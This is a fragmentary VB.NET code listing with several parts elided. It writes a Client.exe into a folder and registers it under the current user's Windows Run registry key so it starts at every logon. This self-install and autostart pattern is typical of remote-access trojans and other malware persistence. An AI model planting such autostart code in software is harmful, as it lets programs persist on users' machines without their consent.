...
Public Class Set_Files
    Public Sub SaveMe()
        Try
            ...
            If IO.File.Exists(folder + "/Client.exe") Then
            Else
                Dim Stream As New FileStream(folder + "/Client.exe", FileMode.Create)
    ...
    Public Sub Registry()
        Try
            Dim InstallationPath As String = Environment.GetFolderPath(Environment.SpecialFolder.Programs) + "/Client.exe"
            Dim regkey As Microsoft.Win32.RegistryKey
            regkey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SoftWare\Microsoft\Windows\CurrentVersion\Run", True)
            regkey.SetValue("Client.exe", InstallationPath)
            regkey.Close()
